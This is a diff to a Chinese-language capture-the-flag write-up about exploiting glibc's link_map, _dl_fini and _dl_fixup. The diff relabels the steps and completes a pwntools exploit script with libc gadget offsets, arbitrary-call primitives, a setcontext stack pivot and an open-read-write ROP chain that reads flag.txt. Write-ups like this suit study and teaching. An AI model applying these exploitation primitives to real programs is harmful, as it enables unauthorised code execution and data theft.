@@ -452,7 +452,7 @@ link_map 結構中的第一個 member `l_addr` 存放 ASLR 的 code base address
 
 ---
 
-### 1
+### 1. resolve write to _Exit@got and then infinitely write
 
 ```python
 gotoff__Exit_write = e.got["_Exit"] - e.got["write"]
@@ -488,7 +488,7 @@ write(binary_map.l_addr(), p8(gotoff__Exit_write))
 
 ---
 
-### 2
+### 2. clear version info and write code base
 
 即使有了任意寫入，但我們沒有任何關於 address 的 information，因此很難控制程式的執行流程
 ，不過 link_map 中有一個 pointer " `l->l_info[DT_FINI]`" 被用來定義程式終止時呼叫的 fini function，當呼叫 `exit()` (沒有底線的版本) 時，會在 exit handler 的結尾呼叫到 `_dl_fini()`，此 function 會間接呼叫到 `l_addr + l->l_info[DT_FINI].d_un.d_ptr` 存放的 destructor function ([src](https://elixir.bootlin.com/glibc/glibc-2.31/source/elf/dl-fini.c#L141))：
@@ -676,7 +676,7 @@ restore_rela_table()
 
 ---
 
-### 3
+### 3. resolve function to _dl_fini of ld
 
 在此之前需要先了解 `_dl_fixup()` 背後所呼叫的 function `_dl_lookup_symbol_x()` 以及 `do_lookup_x()`：
 
@@ -1092,7 +1092,7 @@ _dl_fini (void)
 
 ---
 
-### 4
+### 4. setup arbitrary call primitive
 
 有了步驟 1~3 的建置，我們已經可以構造出呼叫任意 function 的 primitive 了，參考下方執行 `_dl_fini()` 的注意事項：
 
@@ -1246,7 +1246,9 @@ $7 = {
 }
 ```
 
+---
 
+### 5. create symbol table
 
 有了任意呼叫 function 的 primitive 之後，再來我們要構造出可控的 `malloc()` 以及 `free()` 的 primitive，之後的 exploit 會需要 `malloc()` 以及 `free()` 來產生合法的 pointer，讓我們能構造正常的 link_map。
 
@@ -1477,7 +1479,7 @@ __open_memstream(char **bufloc, size_t *sizeloc)
 
 ---
 
-### 5
+### 6. setup the fake link_map
 
 在建構 symbol table 後，我們還需要為 `l_info[]` 建立其他的 chunk，避免存取到非法的 pointer。由於 `linkmap` 的使用只在呼叫 `_dl_fixup()` 的時候，因此不需要所有的 `l_info[]` 都建構完，只需構造出部分的即可，在此省略分配的過程，詳情可以參考 exploit 的操作與註解，最後建置好的 `l_info[]` 相關資料如下，如果沒有列出來則代表不需要：
 
@@ -1618,7 +1620,7 @@ value = l->l_addr + sym->st_value;
 
 ---
 
-### 6
+### 7. setup stack pivoting gadget and ORW rop chain
 
 在此我們有了**任意寫** (use fake linkmap) + **任意執行** (controlable `_dl_fini()`)，接下來就是構造 ROP chain，此 ROP chain 分成兩個部分：
 
@@ -1664,7 +1666,9 @@ value = l->l_addr + sym->st_value;
 
 
 
-最後 exploit 如下 (stack pivoting 還沒做完)：
+## 8. Win
+
+最後 exploit 如下：
 
 ```python
 #!/usr/bin/python3
@@ -1853,7 +1857,7 @@ write(binary_map.l_info(d_tag['DT_STRTAB']), p8(l_info_last_byte['DT_DEBUG']))
 set_rela_table(elf64_rela(e.got["write"] - gotoff__Exit_write, 0x200000007, 0))
 restore_rela_table()
 
-### STEP4.
+### STEP4. setup arbitrary call primitive
 ## because _exit@got saves the _dl_fini address, we can restore l->l_addr
 write(binary_map.l_addr(), p8(0))
 # make l_info[DT_FINI] point to l_info[DT_DEBUG]
@@ -1941,7 +1945,7 @@ def ptr_write(offset):
     write(libc.symbols["global_max_fast"], p64(0x80))
     return -page_mem_alloc # return the offset
 
-#### STEP4. create symbol table
+#### STEP5. create symbol table
 info("main_arena: p (*(struct malloc_state *) 0x15555550ac60)")
 info("global_max_fast: x/10gx 0x1555555121c0")
 symtab_dyn = ptr_write(fake_linkmap.l_info(d_tag['DT_SYMTAB'])) # 6
@@ -1967,7 +1971,7 @@ write(fake_linkmap.l_info(d_tag['DT_SYMTAB']), p8(0x90))
 # symtab will be symtab_dyn + 0x110
 symtab = symtab_dyn + 0x110
 
-#### STEP5. setup the fake link_map
+#### STEP6. setup the fake link_map
 # build strtab and pltgot
 # mmap 0x1555551ad000
 strtab = ptr_write(fake_linkmap.l_info(d_tag['DT_STRTAB'])) # 5
@@ -2010,13 +2014,49 @@ def rel_write(where, what):
     # rsi: 1 (reloc_arg)
     call_func(ld.symbols["_dl_fixup"])
 
-#### STEP6. setup stack pivoting gadget
+#### STEP7. setup stack pivoting gadget
 # 0x146110 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]
-#rop_rbx_write_call = libc.address + 0x146110
-#rel_write(_rtld_global._dl_load_lock() + 8, 0) # rbx
-#rel_write(0x20, libc.symbols["setcontext"] + 61) # rdx + 0x20
-#rel_write(0xA0, 0x100)
-TODO
+rop_rbx_write_call = libc.address + 0x146110
+rop_pop_rdi_ret = libc.address + 0x2daa2
+rop_pop_rsi_ret = libc.address + 0x37bca
+rop_pop_rdx_ret = libc.address + 0xde622
+rop_pop_rax_ret = libc.address + 0x44710
+rop_syscall_ret = libc.address + 0x88406
+rop_read = libc.symbols["read"]
+rop_write = libc.symbols["write"]
+info(f"b *0x15555545e110")
+# make "mov rdx, qword ptr [rdi + 8]" get chunk address at rdx
+rel_write(_rtld_global._dl_load_lock() + 8, 0)
+rel_write(0x20, libc.symbols["setcontext"] + 61) # first function
+rel_write(0xA0, 0x100) # new stack is chunk + 0x100
+rel_write(0xA8, libc.symbols["setcontext"] + 334) # ret
+write(ld.symbols["_r_debug"], b"flag.txt\x00")
+ROP_chain = [
+    rop_pop_rdi_ret, ld.symbols["_r_debug"],
+    rop_pop_rsi_ret, 0,
+    rop_pop_rdx_ret, 0,
+    rop_pop_rax_ret, 2,
+    rop_syscall_ret,
+
+    rop_pop_rdi_ret, 3,
+    rop_pop_rsi_ret, ld.symbols["_r_debug"],
+    rop_pop_rdx_ret, 0x30,
+    rop_read,
+
+    rop_pop_rdi_ret, 1,
+    rop_write,
+]
+
+for i in range(len(ROP_chain)):
+    if ROP_chain[i] <= 0x30:
+        write(0x100 + i*8, p8(ROP_chain[i]))
+    else:
+        rel_write(0x100 + i*8, ROP_chain[i])
+
+# win
+gdb.attach(r, load_sym)
+input()
+call_func(rop_rbx_write_call)
 r.interactive()
 ```
 
